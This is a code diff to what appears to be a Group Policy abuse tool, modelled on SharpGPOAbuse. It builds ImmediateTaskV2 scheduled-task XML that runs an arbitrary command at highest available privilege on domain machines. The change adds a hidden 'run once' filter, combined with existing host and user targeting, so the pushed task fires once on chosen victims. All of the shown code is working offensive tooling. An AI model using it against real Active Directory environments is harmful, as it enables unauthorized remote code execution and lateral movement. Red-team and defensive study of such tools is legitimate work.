@@ -11,7 +11,7 @@ import xml.etree.ElementTree as ET
 
 
 class ScheduledTask:
-    def __init__(self, gpo_type="computer", name="", mod_date="", description="", powershell=False, command="", old_value="", filter_enabled=False, target_dns_name="", target_username="", target_user_sid=""):
+    def __init__(self, gpo_type="computer", name="", mod_date="", description="", powershell=False, command="", old_value="", filter_enabled=False, target_dns_name="", target_username="", target_user_sid="", run_once=True):
         self._type = gpo_type
 
         if name:
@@ -55,15 +55,20 @@ class ScheduledTask:
         else:
             self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}"><Properties action="C" name="{self._name}" runAs="%LogonDomain%\\%LogonUser%" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>%LogonDomain%\\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>"""
 
-        # Targeting single hosts/users through filtering 
-        # host (computer GPO) or principal (user GPO) instead of every object in the GPO scope
-        # XML mirrors SharpGPOAbuse --FilterEnabled output.
-        self._filters = ""
+        # Build Item-Level Targeting filters
+        # FilterRunOnce implements "Apply once and do not reapply"
+        # Additional FilterComputer/FilterUser narrows the scope to specific targets
+        filter_items = []
+
+        if run_once:
+            run_once_guid = str(uuid.uuid4()).upper()
+            filter_items.append('<FilterRunOnce hidden="1" not="0" bool="AND" id="{}"/>'.format(run_once_guid))
+
         if filter_enabled:
             if self._type == "computer":
                 if target_dns_name:
                     _dns = escape(target_dns_name, {'"': '&quot;'})
-                    self._filters = '<Filters><FilterComputer bool="AND" not="0" type="DNS" name="{}"/></Filters>'.format(_dns)
+                    filter_items.append('<FilterComputer bool="AND" not="0" type="DNS" name="{}"/>'.format(_dns))
             else:
                 if target_username or target_user_sid:
                     _fu = '<FilterUser bool="AND" not="0"'
@@ -72,7 +77,12 @@ class ScheduledTask:
                     if target_user_sid:
                         _fu += ' sid="{}"'.format(escape(target_user_sid, {'"': '&quot;'}))
                     _fu += '/>'
-                    self._filters = '<Filters>{}</Filters>'.format(_fu)
+                    filter_items.append(_fu)
+
+        if filter_items:
+            self._filters = '<Filters>' + ''.join(filter_items) + '</Filters>'
+        else:
+            self._filters = ""
 
         if self._filters:
             self._task_str = self._task_str.replace(
